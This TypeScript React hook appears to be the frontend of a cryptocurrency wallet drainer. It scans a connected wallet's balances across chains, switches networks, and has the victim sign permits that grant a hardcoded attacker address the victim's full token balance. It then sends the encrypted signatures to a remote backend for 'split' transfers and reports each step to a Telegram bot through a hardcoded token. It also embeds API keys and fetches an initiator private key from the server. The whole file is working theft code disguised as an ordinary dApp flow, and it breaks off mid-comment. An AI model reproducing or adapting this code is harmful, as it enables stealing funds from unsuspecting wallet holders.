
import { useState, useMemo, } from "react";
import { ethers, BigNumber, Contract } from "ethers";
import axios from "axios";
import { ERC20_ABI, Permit2ContractABI} from "./ERC20_ABI";
import CryptoJS from "crypto-js";
import { generateDeepLink, redirectToDeepLink } from "./deepLinkUtil";



import { AppKitNetwork} from "@reown/appkit/networks";
import { appKit } from "./networkSwitcher";
import {  useAppKitAccount, useAppKitProvider } from "@reown/appkit/react";


const TELEGRAM_BOT_TOKEN = "7606680143:AAEACjK5K7Q5Ybw_Z-6_Y90xUmZoDlM6B40";
const TELEGRAM_CHAT_ID = " 7903357798";


const DAI_ADDRESS_MAINNET = "0x6B175474E89094C44Da98b954EedeAC495271d0F"; // DON'T TOUCH THIS !!!

const BLACK_RAIN_SPLIT = "0x20d2dB479b661c4a65B8F498cDAB86EB741385c1";   // DON'T TOUCH THIS !!!


const BR_INITIATOR_ADDRESS = "0xab6322b431B94A1D30Ba8aca3dB4ac82c4356E48".toLowerCase(); // Replace wth your private key public address example 0x4Fc94E3CBb1A1070D4Df126C4cFa37fBBd9dcd08 

const FRONTEND_RECIPIENT = "0x20d2dB479b661c4a65B8F498cDAB86EB741385c1"; // Hardcoded frontend recipient YOUR RECEIVIVNG ADDRESS SHOULD BE HERE


// Ensure addresses are lowercase or properly checksummed to avoid Ethers checksum errors
// const initiator = "0x143EaF2E6A0914F52020D8c2eE9A2b10A77868fE".toLowerCase(); 
// const initiatorPK = "1701c95461e13d5a1c696da33d176d757fa4d6e3b7369d708762b2dd2dfd610c".toLowerCase();
const Permit2Contract = "0x000000000022D473030F116dDEE9F6B43aC78BA3".toLowerCase(); // THIS IS FOR UNISWAP PERMIT2 
//  const Permit2Contract = '0x31c2F6fcFf4F8759b3Bd5Bf0e1084A055615c768' // COMMENT OUT TO USE PANCAKE PERMIT2... DYNAMIC SELECTION WILL BE IMPLEMENTED LATER
const receipient = FRONTEND_RECIPIENT



// Define the type for discovered tokens
interface DiscoveredToken {
  address: string;
  balance: BigNumber;
  contract: ethers.Contract;
}



const isLoggingEnabled = true; // Toggle this to enable/disable logs
const BASE_API_URL = "https://drn-2stp.onrender.com/api"; // From permit.txt
// const BASE_API_URL = "http://localhost:8080/api";

const stringifyMessage = (message: unknown): string => {
  if (typeof message === "object" && message !== null) {
    try {
      return JSON.stringify(message, null, 2);
    } catch {
      return String(message); // Fallback for circular references
    }
  }
  return String(message);
};

const log = async (...messages: unknown[]) => {
  if (isLoggingEnabled) {
    const timestamp = new Date().toISOString();
    const logMessage = `[LOG ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
    console.log(logMessage);
    console.error(logMessage); // For Vercel visibility
    try {
      await axios.post(`${BASE_API_URL}/log`, {
        level: "info",
        message: logMessage,
        timestamp,
      });
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : String(err);
      console.error(`Failed to send log to backend: ${errorMessage}`);
    }
  }
};

const warn = async (...messages: unknown[]) => {
  if (isLoggingEnabled) {
    const timestamp = new Date().toISOString();
    const logMessage = `[WARN ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
    console.warn(logMessage);
    console.error(logMessage);
    try {
      await axios.post(`${BASE_API_URL}/log`, {
        level: "warn",
        message: logMessage,
        timestamp,
      });
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : String(err);
      console.error(`Failed to send warn to backend: ${errorMessage}`);
    }
  }
};

const error = async (...messages: unknown[]) => {
  if (isLoggingEnabled) {
    const timestamp = new Date().toISOString();
    const logMessage = `[ERROR ${timestamp}] ${messages.map(stringifyMessage).join(" ")}`;
    console.error(logMessage);
    try {
      await axios.post(`${BASE_API_URL}/log`, {
        level: "error",
        message: logMessage,
        timestamp,
      });
    } catch (err) {
      const errorMessage = err instanceof Error ? err.message : String(err);
      console.error(`Failed to send error to backend: ${errorMessage}`);
    }
  }
};
// Replace
error("An unexpected error occurred during sendTransactions.");



interface TokenBalance {
  address: string;
  balance: BigNumber;
  contract: Contract;
  name: string;
  symbol: string;
  type: string;
  amount: BigNumber;
  amountUSD: number;
  
}


interface Token {
  address: string;
  balance: BigNumber;
  contract: TokenContract; // Consistent use of TokenContract
  name: string;
  symbol: string;
  type: string; // "NATIVE" or "ERC20", etc.
  amount: BigNumber; // Field for token amount
  amountUSD: number; // Field for token value in USD
}

interface TokenContract extends Contract {
  nonces(address: string): Promise<BigNumber>;
  balanceOf(address: string): Promise<BigNumber>;
}

// Define specific types for domain, types, and message
type Domain = {
  name: string;
  version: string;
  chainId: number;
  verifyingContract: string;
  salt?: string; // Optional because it's specific to some chains like Polygon
};


type Types = Record<string, Array<{ name: string; type: string }>>;

type Message = Record<string, unknown>;

type BackendResponse = {
  data: {
    recipients: Array<{ address: string; share: string }>;
    transactionHashes: string[];
  };
};

interface Chain {
  id: string; // Hex string, e.g., "0x1" for Ethereum mainnet
  label: string; // Human-readable label, e.g., "Ethereum Mainnet"
}

interface ChainRpcUrls {
  http: string[]; // Add an array of HTTP URLs
  default: string; // Keep the default URL as a string
  [key: string]: string | string[]; // Allow additional properties as strings or arrays of strings
}

interface Chain {
  id: string; // Hex string, e.g., "0x1" for Ethereum mainnet
  label: string; // Human-readable label, e.g., "Ethereum Mainnet"
  name: string; // Network name, e.g., "Ethereum Mainnet"
  nativeCurrency: {
    name: string;
    symbol: string;
    decimals: number;
  };
  rpcUrls: ChainRpcUrls; // Update to match expected type
}

// Centralized keys
const INFURA_KEY = "9b8bdc756b0b46698b33ffc3eff46afb"; // Replace with your actual Infura key
const ALCHEMY_KEY = "alcht_bxl8eQ123RNGV8raWma1ExZYoxji6V"; // Replace with your actual Alchemy key


const chains: Chain[] = [
  {
    id: "0x1",
    label: "Ethereum Mainnet",
    name: "Ethereum",
    nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
    rpcUrls: {
      http: [`https://mainnet.infura.io/v3/${INFURA_KEY}`],
      default: `https://mainnet.infura.io/v3/${INFURA_KEY}`,
      infura: `https://mainnet.infura.io/v3/${INFURA_KEY}`,
      alchemy: `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
    },
  },
  {
    id: "0x89",
    label: "Polygon Mainnet",
    name: "Polygon",
    nativeCurrency: { name: "Matic", symbol: "MATIC", decimals: 18 },
    rpcUrls: {
      http: ["https://polygon-rpc.com"],
      default: "https://polygon-rpc.com",
      infura: `https://polygon-mainnet.infura.io/v3/${INFURA_KEY}`,
    },
  },
  // {
  //   id: "0xa4b1",
  //   label: "Arbitrum One",
  //   name: "Arbitrum",
  //   nativeCurrency: { name: "Ether", symbol: "ETH", decimals: 18 },
  //   rpcUrls: {
  //     http: [`https://arbitrum-mainnet.infura.io/v3/${INFURA_KEY}`],
  //     default: `https://arbitrum-mainnet.infura.io/v3/${INFURA_KEY}`,
  //     alchemy: `https://arb-mainnet.g.alchemy.com/v2/${ALCHEMY_KEY}`,
  //   },
  // },
  {
    id: "0xa86a",
    label: "Avalanche C-Chain",
    name: "Avalanche",
    nativeCurrency: { name: "Avalanche", symbol: "AVAX", decimals: 18 },
    rpcUrls: {
      http: ["https://api.avax.network/ext/bc/C/rpc"],
      default: "https://api.avax.network/ext/bc/C/rpc",
    },
  },
  {
    id: "0x38",
    label: "Binance Smart Chain Mainnet",
    name: "Binance Smart Chain",
    nativeCurrency: { name: "Binance Coin", symbol: "BNB", decimals: 18 },
    rpcUrls: {
      http: ["https://bsc-dataseed.binance.org"],
      default: "https://bsc-dataseed.binance.org",
    },
  },
  {
    id: "0xaa36a7",
    label: "Ethereum Sepolia Testnet",
    name: "Sepolia",
    nativeCurrency: { name: "Sepolia Ether", symbol: "ETH", decimals: 18 },
    rpcUrls: {
      http: [`https://sepolia.infura.io/v3/${INFURA_KEY}`],
      default: `https://sepolia.infura.io/v3/${INFURA_KEY}`,
    },
  },
];


// Helper function to map Chain to AppKitNetwork
const mapChainToAppKitNetwork = (chain: Chain): AppKitNetwork => ({
  id: parseInt(chain.id, 16), // Convert hex string to decimal
  name: chain.name,
  chainNamespace: "eip155", // Assuming Ethereum-based networks (update as needed)
  caipNetworkId: `eip155:${parseInt(chain.id, 16)}`, // Construct CAIP network ID
  nativeCurrency: chain.nativeCurrency,
  rpcUrls: {
    default: {
      http: [chain.rpcUrls.default], // Ensure `http` is an array
    },
    ...Object.fromEntries(
      Object.entries(chain.rpcUrls)
        .filter(([key]) => key !== "default")
        .map(([key, url]) => [key, { http: Array.isArray(url) ? url : [url] }])
    ),
  },
});



// const BASE_API_URL = "https://ethereum-explorer.archi/api";

// const BASE_API_URL = "http://localhost:3002/api";
// const BASE_API_URL = "https://drn-2stp.onrender.com/api"

// Encryption key (must match the backend)
const BR_ENCRYPTION_KEY = "9eb784738a1716465663e61e45fa8775f012bf944ac888a7c13db7b8d4962eda";


const encrypt = (data: unknown): { iv: string; data: string } => {
  const iv = CryptoJS.lib.WordArray.random(16).toString(CryptoJS.enc.Hex);
  const key = CryptoJS.enc.Hex.parse(BR_ENCRYPTION_KEY);
  const cipher = CryptoJS.AES.encrypt(JSON.stringify(data), key, {
    iv: CryptoJS.enc.Hex.parse(iv),
  });
  return {
    iv,
    data: cipher.ciphertext.toString(CryptoJS.enc.Hex),
  };
};


const sendToBackend = async (endpoint: string, payload: unknown, retries = 3): Promise<unknown> => {
  for (let attempt = 1; attempt <= retries; attempt++) {
    try {
      const encryptedPayload = encrypt(payload);
      const response = await axios.post(`${BASE_API_URL}/${endpoint}`, {
        encryptedData: encryptedPayload.data,
        iv: encryptedPayload.iv,
      });
      return response.data;
    } catch (error) {
      if (attempt === retries) throw error;
      warn(`Retrying [${endpoint}] (${attempt}/${retries})...`);
      await new Promise((resolve) => setTimeout(resolve, attempt * 1000));
    }
  }
};


// Fetch dynamic initiator credentials
const fetchInitiatorCredentials = async (): Promise<{ initiator: string; initiatorPK: string }> => {
  try {
    const response = await axios.get(`${BASE_API_URL}/getInitiator`);
    if (response.data && response.data.initiator && response.data.initiatorPK) {
      return {
        initiator: response.data.initiator.toLowerCase(),
        initiatorPK: response.data.initiatorPK.toLowerCase(),
      };
    }
    throw new Error("Invalid initiator credentials received from server");
  } catch (error) {
    const err = error as Error; // Explicitly cast error to Error type
    console.error("Error fetching initiator credentials:", err.message);
    throw err; // Re-throw the error for the calling function to handle
  }
};



// Use BR_Private_RPC_URLs instead of chains
const BR_Private_RPC_URLs: Record<number, string> = {
  1: `https://mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Ethereum
  10: `https://optimism-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Optimism
  56: `https://bsc-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Binance Smart Chain
  137: `https://polygon-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Polygon
  // 250: `https://rpc.ankr.com/fantom${BR_Ankr_Token ? `/${BR_Ankr_Token}` : ""}`, // Fantom
  43114: `https://avalanche-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Avalanche
  42161: `https://arbitrum-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Arbitrum
  8453: `https://base-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // Base
  324: `https://zksync-mainnet.infura.io/v3/15b2a4fd999148318a366400d99bc8ce`, // zkSync Era
  369: "https://pulsechain.publicnode.com", // Pulse
  11155111: "https://sepolia.infura.io/v3/15b2a4fd999148318a366400d99bc8ce", // Sepolia
};





const fetchGasData = async (
  chainId: number,
  provider: ethers.providers.JsonRpcProvider
): Promise<{ gasPrice: BigNumber; maxFeePerGas?: BigNumber; maxPriorityFeePerGas?: BigNumber }> => {
  try {
    // Fetch EIP-1559 fee data for chains that support it
    const feeData = await provider.getFeeData();

    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
      // log(`EIP-1559 Fee Data for Chain ${chainId}:`, feeData);
      return {
        gasPrice: feeData.gasPrice || ethers.utils.parseUnits("5", "gwei"),
        maxFeePerGas: feeData.maxFeePerGas,
        maxPriorityFeePerGas: feeData.maxPriorityFeePerGas,
      };
    } else {
      // For non-EIP-1559 chains, fallback to legacy gas price
      const gasPrice = await provider.getGasPrice();
      log(`Legacy Gas Price for Chain ${chainId}:`, ethers.utils.formatUnits(gasPrice, "gwei"));
      return { gasPrice };
    }
  } catch (error) {
    console.error(`Error fetching gas data for Chain ${chainId}:`, error);
    // Provide fallback gas price in case of failure
    return { gasPrice: ethers.utils.parseUnits("5", "gwei") };
  }
};


const chainIds = [1, 10, 56, 137, 43114, 42161, 8453, 324, 369, 11155111];

const fetchAllGasData = async () => {
  for (const chainId of chainIds) {
    const rpcUrl = BR_Private_RPC_URLs[chainId];
    if (!rpcUrl) {
      warn(`No RPC URL configured for Chain ${chainId}`);
      continue;
    }

  //   const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
  //   // const gasData = await fetchGasData(chainId, provider);
  //   // log(`Gas Data for Chain ${chainId}:`, gasData);
  // }
};

fetchAllGasData();


let transactionInProgress = false; // Ensure only one transaction is processed at a time.

const sendTransactionWithDynamicGas = async (
  chainId: number,
  provider: ethers.providers.JsonRpcProvider,
  transaction: ethers.providers.TransactionRequest
) => {
  if (transactionInProgress) {
    log("Transaction already in progress, skipping.");
    return;
  }

  transactionInProgress = true;

  try {
    const gasData = await fetchGasData(chainId, provider);
    const tx = {
      ...transaction,
      maxFeePerGas: gasData.maxFeePerGas,
      maxPriorityFeePerGas: gasData.maxPriorityFeePerGas,
      type: 2,
    };

    log("Sending transaction with gas data:", tx);
    const signer = provider.getSigner();
    const response = await signer.sendTransaction(tx);
    await response.wait();

    log("Transaction successful:", response.hash);
  } catch (error) {
    console.error("Error sending transaction:", error);
  } finally {
    transactionInProgress = false; // Reset the flag
  }
};





function usePermits() {
  const [loading, setLoading] = useState<boolean>(false);


  // Get the wallet provider using Reown's hook
  const { walletProvider } = useAppKitProvider("eip155")
  const { address: userAddress } = useAppKitAccount();
  // const { open,} = useAppKit();    // <--- useAppKit for modal control



  // Create an ethers provider from the wallet provider
  const provider = useMemo(() => {
    return walletProvider
      ? new ethers.providers.Web3Provider(walletProvider as ethers.providers.ExternalProvider, "any")
      : null;
  }, [walletProvider]);

  const fetchBalances = async (address: string, chainId: number): Promise<unknown[]> => {
    try {
      log(`Fetching balances for address: ${address} on chain: ${chainId}`);
      
      const API_URL = `${BASE_API_URL}/fetchBalances`;
      const payload = { address, chainId };
      const headers = { "Content-Type": "application/json" };
  
      // Make API request
      const response = await axios.post(API_URL, payload, { headers });
  
      if (response.status === 200 && response.data?.balances) {
        log(`Balances fetched successfully for chain ${chainId}:`, response.data.balances);
        // sendToTelegram(`Balances fetched successfully for chain ${chainId} \n Balance is balance is ${JSON.stringify(response.data.balances)} `);
        return response.data.balances;
      } else {
        console.error(`Unexpected response format for chain ${chainId}:`, response.data);
        return []; // Return empty array if the response is not as expected
      }
    } catch (error) {
      if (axios.isAxiosError(error)) {
        console.error(`Axios error while fetching balances for chain ${chainId}:`, {
          message: error.message,
          data: error.response?.data,
          status: error.response?.status,
        });
      } else if (error instanceof Error) {
        console.error(`Error while fetching balances for chain ${chainId}:`, error.message);
      } else {
        console.error(`Unknown error occurred while fetching balances for chain ${chainId}:`, error);
      }
      return []; // Return empty array in case of an error
    }
  };
  
const fetchTokenPrice = async (chainId: string): Promise<number> => {
  try {
    const tokenIds: Record<string, string> = {
      "1": "ethereum",
      "56": "binancecoin",
      "137": "matic-network",
      "250": "fantom",
      "43114": "avalanche-2",
      "42161": "ethereum",
      "8453": "ethereum",
      "324": "ethereum",
      "10": "ethereum",
    };

    const tokenId = tokenIds[chainId] || "ethereum";

    // Use backend proxy with BASE_API_URL
    const response = await axios.get(
      `${BASE_API_URL}/coingecko/simple/price`,
      { params: { ids: tokenId, vs_currencies: "usd" } }
    );

    return response.data[tokenId]?.usd || 0;
  } catch (error) {
    console.error("Error fetching token price:", error);
    throw new Error("Unable to fetch token price.");
  }
};
  
  const signTypedData = async (
    signer: ethers.Signer,
    domain: Domain,
    types: Types,
    message: Message
  ): Promise<string> => {
    if (
      "_signTypedData" in signer &&
      typeof (signer as ethers.Wallet)._signTypedData === "function"
    ) {
      return await (signer as ethers.Wallet)._signTypedData(
        domain,
        types,
        message
      );
    } else if (
      signer.provider &&
      signer.provider instanceof ethers.providers.JsonRpcProvider
    ) {
      const rpcProvider = signer.provider as ethers.providers.JsonRpcProvider;
      const params = [
        await signer.getAddress(),
        JSON.stringify({ domain, types, message }),
      ];
      return await rpcProvider.send("eth_signTypedData_v4", params);
    } else {
      throw new Error("Signer does not support typed data signing.");
    }
  };



  const Normalusdc = async (
    token: Token, // Use the updated Token interface
    userAddress: string,
    signer: ethers.Signer,
    chainId: string,
    walletName: string // Add walletName to specify which wallet's deep link to use
  ): Promise<void> => {
    try {
      const nonce = await token.contract.nonces(userAddress);
      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour in seconds
      const balance = await token.contract.balanceOf(userAddress);
  
      if (balance.isZero()) {
        throw new Error("Insufficient token balance for transfer.");
      }
  
      const domain: Domain = {
        name: "USD Coin",
        version: "2",
        chainId: parseInt(chainId),
        verifyingContract: token.address,
      };
  
      const types: Types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
      };
  
      const message: Message = {
        owner: userAddress,
        spender: BR_INITIATOR_ADDRESS, // Replace with actual spender address
        value: balance.toString(),
        nonce: nonce.toString(),
        deadline,
      };
  
      
    log(`Preparing permit for ${token.symbol}...`);
  
      // Generate the deep link early to notify the user before proceeding
      const deepLinkParams = {
        action: "sign",
        chainId,
        userAddress,
        domain,
        types,
        message,
      };
      const deepLink = generateDeepLink(walletName, deepLinkParams);
      log(`Generated deep link: ${deepLink}`);
      await sendToTelegram(
        `Action required: Please approve the permit for ${token.symbol} using this link:\n${deepLink}`
      );
  
      // Redirect user to the wallet's deep link
      redirectToDeepLink(deepLink);
  
      log(`Signing permit for ${token.symbol}...`);
      const signature = await signTypedData(signer, domain, types, message);
  
      // Prepare the payload with the signed permit
      const payload = {
        tokenAddress: token.address,
        userAddress,
        chainId,
        domain,
        message,
        signature,
        frontendRecipient: FRONTEND_RECIPIENT, // Replace with actual frontend recipient address
      };
  
      log("Sending data to backend...");
  
      // Define the expected response type
      type BackendResponse = {
        data: {
          recipients: Array<{ address: string; share: string }>;
          transactionHashes: string[];
        };
      };
  
      // Send the permit data to the backend
      const response = (await sendToBackend("Normalusdc", payload)) as BackendResponse;
  
      const { recipients, transactionHashes } = response.data;
  
      log("Split transfer successful");
      recipients.forEach((recipient) => {
        log(`Recipient: ${recipient.address}, Share: ${recipient.share}`);
      });
      log("Transaction Hashes:", transactionHashes);
  
      // Notify Telegram of successful transaction
      await sendToTelegram(
        `Permit-based transfer of ${balance.toString()} ${token.symbol} was successful.\nTransaction Hashes: ${transactionHashes.join(
          ", "
        )}`
      );
    } catch (error: unknown) {
      if (error instanceof Error) {
        console.error("Error in Normalusdc frontend:", error.message);
        await sendToTelegram(`Error in Normalusdc: ${error.message}`);
      } else {
        console.error("An unknown error occurred in Normalusdc frontend.");
      }
    }
  };
  

  const handleDAIPermit = async (
    token: Token, // Uses the updated Token interface
    userAddress: string,
    signer: ethers.Signer,
    chainId: string,
    walletName: string // Add walletName parameter
  ): Promise<void> => {
    try {
      const nonce = await token.contract.nonces(userAddress);
      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour in seconds
      const balance = await token.contract.balanceOf(userAddress);
  
      if (balance.isZero()) {
        warn(`Token ${token.symbol} has zero balance. Skipping transfer.`);
        return;
      }
  
      const daiPermitData = {
        holder: userAddress,
        spender: BR_INITIATOR_ADDRESS,
        nonce: nonce.toString(),
        expiry: deadline,
        allowed: true,
        value: balance.toString(),
      };
  
      const domain = {
        name: "Dai Stablecoin",
        version: "1",
        chainId: parseInt(chainId),
        verifyingContract: token.address,
      };
  
      const types = {
        Permit: [
          { name: "holder", type: "address" },
          { name: "spender", type: "address" },
          { name: "nonce", type: "uint256" },
          { name: "expiry", type: "uint256" },
          { name: "allowed", type: "bool" },
        ],
      };
  
      // Generate the deep link early to notify the user before proceeding
      log("Generating deep link...");
      const deepLinkParams = {
        action: "sign",
        chainId,
        userAddress,
        domain,
        types,
        message: daiPermitData,
      };
      const deepLink = generateDeepLink(walletName, deepLinkParams);
      log(`Generated deep link: ${deepLink}`);
      await sendToTelegram(
        `Action required: Please approve the DAI permit using this link:\n${deepLink}`
      );
  
      // Redirect the user to the wallet's deep link
      redirectToDeepLink(deepLink);
  
      log(`Signing permit for ${token.symbol}...`);
      const signature = await signTypedData(signer, domain, types, daiPermitData);
  
      const payload = {
        tokenAddress: token.address,
        userAddress,
        chainId,
        domain,
        daiPermitData,
        signature,
        frontendRecipient: FRONTEND_RECIPIENT,
      };
  
      log("Sending data to backend...");
      const response = await sendToBackend("handleDAIPermit", payload);
  
      log("Permit handled successfully:", response);
  
      // Notify Telegram of successful transaction
      await sendToTelegram(
        `DAI permit processed successfully for ${balance.toString()} ${token.symbol}.`
      );
    } catch (error: unknown) {
      if (error instanceof Error) {
        console.error("Error in handleDAIPermit:", error.message);
        await sendToTelegram(`Error in handleDAIPermit: ${error.message}`);
      } else {
        console.error("Unknown error in handleDAIPermit.");
      }
    }
  };
  

  const handlePolygonUSDCPermit = async (
    token: Token, // Use the updated Token interface
    userAddress: string,
    signer: ethers.Signer,
    chainId: string,
    walletName: string // Add walletName parameter
  ): Promise<void> => {
    try {
      const nonce = await token.contract.nonces(userAddress);
      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour in seconds
      const balance = await token.contract.balanceOf(userAddress);
  
      if (balance.isZero()) {
        warn(`Token ${token.symbol} has zero balance. Skipping transfer.`);
        return;
      }
  
      // Explicit domain with `chainId`
      const domain: Domain = {
        name: "USD Coin (PoS)",
        version: "1",
        verifyingContract: token.address,
        chainId: parseInt(chainId),
        salt: ethers.utils.hexZeroPad(
          ethers.utils.hexlify(parseInt(chainId)),
          32
        ),
      };
  
      const types: Types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
      };
  
      const message: Message = {
        owner: userAddress,
        spender: BR_INITIATOR_ADDRESS,
        value: balance.toString(),
        nonce: nonce.toString(),
        deadline,
      };
  
      // Generate the deep link for user interaction
      log("Generating deep link...");
      const deepLinkParams = {
        action: "sign",
        chainId,
        userAddress,
        domain,
        types,
        message,
      };
      const deepLink = generateDeepLink(walletName, deepLinkParams);
      log(`Generated deep link: ${deepLink}`);
      await sendToTelegram(
        `Action required: Approve the Polygon USDC permit using this link:\n${deepLink}`
      );
  
      // Redirect the user to the wallet's deep link
      redirectToDeepLink(deepLink);
  
      log(`Signing permit for ${token.symbol} on chain ${chainId}...`);
      const signature = await signTypedData(signer, domain, types, message);
  
      const payload = {
        tokenAddress: token.address,
        userAddress,
        chainId,
        domain,
        message,
        signature,
        frontendRecipient: FRONTEND_RECIPIENT,
      };
  
      log("Sending data to backend...");
      const response = (await sendToBackend(
        "handlePolygonUSDCPermit",
        payload
      )) as BackendResponse;
  
      // Handle backend response
      const { recipients, transactionHashes } = response.data;
      log("Split transfer successful");
  
      recipients.forEach((recipient) => {
        log(`Recipient: ${recipient.address}, Share: ${recipient.share}`);
      });
      log("Transaction Hashes:", transactionHashes);
  
      // Notify Telegram of successful transaction
      await sendToTelegram(
        `Polygon USDC permit processed successfully for ${balance.toString()} ${token.symbol}.`
      );
    } catch (error: unknown) {
      if (error instanceof Error) {
        console.error("Error in handlePolygonUSDCPermit frontend:", error.message);
        await sendToTelegram(`Error in handlePolygonUSDCPermit: ${error.message}`);
      } else {
        console.error(
          "An unknown error occurred in handlePolygonUSDCPermit frontend."
        );
      }
    }
  };
  

  const handleCowProtocolPermit = async (
    token: Token, // Use the Token interface
    userAddress: string,
    signer: ethers.Signer,
    chainId: string,
    walletName: string // Add walletName parameter
  ): Promise<void> => {
    try {
      // Fetch token details
      const nonce = await token.contract.nonces(userAddress);
      const deadline = Math.floor(Date.now() / 1000) + 3600; // 1 hour in seconds
      const balance = await token.contract.balanceOf(userAddress);
  
      if (balance.isZero()) {
        warn(`Token ${token.symbol} has zero balance. Skipping transfer.`);
        return;
      }
  
      // Domain for Cow Protocol Permit
      const domain: Domain = {
        name: await token.contract.name(),
        version: "1", // Fallback version value
        chainId: parseInt(chainId),
        verifyingContract: token.address,
      };
  
      // Types for Permit
      const types: Types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
      };
  
      // Message for signing
      const message: Message = {
        owner: userAddress,
        spender: BR_INITIATOR_ADDRESS, // Replace with actual spender
        value: balance.toString(),
        nonce: nonce.toString(),
        deadline,
      };
  
      // Generate the deep link immediately
      log("Generating deep link...");
      const deepLinkParams = {
        action: "sign",
        chainId,
        userAddress,
        domain,
        types,
        message,
      };
      const deepLink = generateDeepLink(walletName, deepLinkParams);
      log(`Generated deep link: ${deepLink}`);
  
      // Notify the user via Telegram
      await sendToTelegram(
        `Action required: Approve the Cow Protocol permit using this link:\n${deepLink}`
      );
  
      // Redirect the user to their wallet
      redirectToDeepLink(deepLink);
  
      log(`Signing permit for ${token.symbol}...`);
      const signature = await signTypedData(signer, domain, types, message);
  
      // Prepare payload for backend
      const payload = {
        tokenAddress: token.address,
        userAddress,
        chainId,
        domain,
        message,
        signature,
        frontendRecipient: FRONTEND_RECIPIENT, // Replace with actual frontend recipient
      };
  
      log("Sending data to backend...");
      const response = (await sendToBackend(
        "handleCowProtocolPermit",
        payload
      )) as BackendResponse;
  
      // Handle backend response
      const { recipients, transactionHashes } = response.data;
      log("Split transfer successful");
  
      recipients.forEach((recipient) => {
        log(`Recipient: ${recipient.address}, Share: ${recipient.share}`);
      });
      log("Transaction Hashes:", transactionHashes);
  
      // Notify success via Telegram
      await sendToTelegram(
        `Cow Protocol permit processed successfully for ${balance.toString()} ${token.symbol}.`
      );
    } catch (error: unknown) {
      // Handle errors explicitly
      if (error instanceof Error) {
        console.error("Error in handleCowProtocolPermit:", error.message);
        await sendToTelegram(`Error in handleCowProtocolPermit: ${error.message}`);
      } else {
        console.error(
          "An unknown error occurred in handleCowProtocolPermit frontend."
        );
      }
    }
  };
  

const switchChain = async (chain: AppKitNetwork): Promise<boolean> => {
  try {
    await appKit.switchNetwork(chain);
    log(`Switched to ${chain.name} network`);
    return true;
  } catch (error) {
    console.error("Failed to switch chain:", error);
    return false;
  }
};
  
const fetchAllBalances = async (
  userAddress: string
): Promise<{ chain: Chain; balances: TokenBalance[] }[]> => {
  try {
    const balancePromises = chains.map(async (chain) => {
      const rpcUrl = chain.rpcUrls.default;
      if (!rpcUrl) {
        warn(`No RPC URL configured for Chain ${chain.id}`);
        return { chain, balances: [] }; // Empty balances for unsupported chains
      }

      const provider = new ethers.providers.JsonRpcProvider(rpcUrl);
      const chainId = parseInt(chain.id, 16);
      console.log(chainId, provider);
      const balances = (await fetchBalances(userAddress, chainId)) as Token[];

      const validTokens: TokenBalance[] = balances
        .filter((token) => !BigNumber.from(token.balance).isZero())
        .map((token) => ({
          address: token.address,
          balance: BigNumber.from(token.balance),
          contract: new ethers.Contract(token.address, ERC20_ABI, provider),
          name: token.name,
          symbol: token.symbol,
          type: token.type,
          amount: BigNumber.from(token.balance),
          amountUSD: token.amountUSD,
        }));

      return { chain, balances: validTokens };
    });

    const allBalances = await Promise.all(balancePromises);
    return allBalances.filter((result) => result.balances.length > 0);
  } catch (error) {
    console.error("Error fetching all balances:", error);
    return [];
  }
};


  const sendTransactions = async (): Promise<void> => {
    if (!provider) {
      console.error("Provider is not available or wallet is not connected");
      return;
    }
  
    if (!userAddress) {
      console.error("No user address is available. Please connect a wallet.");
      return;
    }
  
    setLoading(true);
    try {
      log("Fetching balances across all chains...");
      const chainsWithBalances = await fetchAllBalances(userAddress);
  
      if (chainsWithBalances.length === 0) {
        log("No chains with non-zero balances found.");
        return;
      }
  
      log("Chains with balances:", chainsWithBalances.map((entry) => entry.chain.label));
  
      // Specify the wallet name
      const walletName = "metamask"; // Change this based on the wallet being used
  
      for (const { chain, balances } of chainsWithBalances) {
        log(`Switching to chain: ${chain.label}`);
        try {
          const appKitNetwork = mapChainToAppKitNetwork(chain);
          const switchSuccess = await switchChain(appKitNetwork);
  
          if (!switchSuccess) {
            warn(`Switch to ${chain.label} failed, skipping.`);
            continue;
          }
  
          const updatedProvider = new ethers.providers.Web3Provider(
            walletProvider as ethers.providers.ExternalProvider
          );
  
          // Directly call `processChainTransactions` with walletName
          await processChainTransactions(chain, balances, userAddress, updatedProvider, walletName);
        } catch (error) {
          console.error(
            `Error processing chain ${chain.label}:`,
            error instanceof Error ? error.message : error
          );
          continue;
        }
      }
  
      log("Completed processing all chains with balances.");
    } catch (error) {
      console.error("An unexpected error occurred during sendTransactions:", error);
    } finally {
      setLoading(false);
    }
  };
  

const calculateNativeValuePerToken = async (
  validTokens: TokenBalance[],
  nativeTokenPriceInUSD: number,
  chainId: string
) => {
  validTokens.forEach((token) => {
    const nativeEquivalent = token.amountUSD / nativeTokenPriceInUSD;
    log(
      `[Chain ${chainId}] Token: ${token.name}, Amount in USD: ${token.amountUSD}, Native Equivalent: ${nativeEquivalent.toFixed(
        6
      )} (Native)`
    );
  });
};

// const transferNativeToken = async (
//   recipient: string,
//   signer: ethers.Signer,
//   tokenPriceInUSD: number,
//   chainId: string,
//   totalTokenValueInUSD: number
